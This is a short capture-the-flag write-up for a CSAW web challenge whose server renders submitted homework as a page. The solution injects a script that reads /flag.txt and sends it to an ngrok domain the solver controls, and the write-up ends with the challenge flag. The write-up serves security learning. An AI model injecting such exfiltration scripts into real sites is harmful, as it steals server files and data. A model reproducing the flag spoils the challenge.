# Validation
Now you have to do your homework!

When you submit a homework assignment, the submission will be validated on the server. What this means, is that your homework submission will be rendered in a webpage on the server! Some nasty things can happen here......

This challange requires you to send the flag to a public IP address (one that you control).

The flag is at /flag.txt, but it can only be accesed by the server itself!

[web.chal.csaw.io:10105](http://web.chal.csaw.io:10105)
## Solution
Since we can write HTML, we can write JavaScript. We also need a public IP address, and we can use a tool like [ngrok](https://ngrok.com/) to view http requests.
```bash
ngrok http 0
```
Running this command will output something like `Forwarding http://XXXXXXXX.ngrok.io -> localhost:0`. We can use the specific domain in our script.
```html
<script>fetch("/flag.txt").then(r => r.text()).then(t => fetch("http://XXXXXXXX.ngrok.io/" + t));</script>
```
The flag will appear in the request log of ngrok.
### Flag
`flag{Validation_feels_good_doesnt_it}`
